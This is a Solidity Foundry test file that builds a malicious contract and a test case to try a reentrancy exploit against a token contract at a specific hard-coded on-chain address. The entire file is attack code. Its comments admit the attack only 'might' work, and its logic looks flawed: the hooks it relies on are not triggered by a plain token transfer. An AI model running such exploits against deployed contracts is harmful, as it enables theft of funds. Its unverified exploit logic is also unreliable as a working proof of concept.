pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

contract MaliciousContract {
    address public target;
    address public attacker;
    bool public inReentrancy;

    constructor(address _target, address _attacker) {
        target = _target;
        attacker = _attacker;
    }

    function triggerTransfer(address to, uint256 amount) external {
        IERC20(target).transfer(to, amount);
    }

    function _executeReentrancy() internal {
        if (!inReentrancy) {
            inReentrancy = true;
            // Re-enter transfer to send tokens back to attacker
            IERC20(target).transfer(attacker, IERC20(target).balanceOf(address(this)));
            inReentrancy = false;
        }
    }

    receive() external payable {
        _executeReentrancy();
    }

    fallback() external payable {
        _executeReentrancy();
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x19d726cd37CA413adf46D9Ae555aB5A5643EdF20;
    address attacker;
    IERC20 target;
    MaliciousContract malicious;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        attacker = address(this);
        target = IERC20(TARGET);
        malicious = new MaliciousContract(TARGET, attacker);
        deal(TARGET, attacker, 10000 * 1e18);
        deal(TARGET, address(malicious), 1000 * 1e18);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = target.balanceOf(attacker);
        uint256 maliciousBalance = target.balanceOf(address(malicious));

        // Have malicious contract transfer tokens to attacker
        // This might trigger reentrancy if _beforeTokenTransfer calls the recipient
        malicious.triggerTransfer(attacker, maliciousBalance);

        uint256 finalBalance = target.balanceOf(attacker);

        // If reentrancy works, attacker should have more than initial + maliciousBalance
        assertGt(finalBalance, initialBalance + maliciousBalance, "Attacker balance should increase due to reentrancy");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
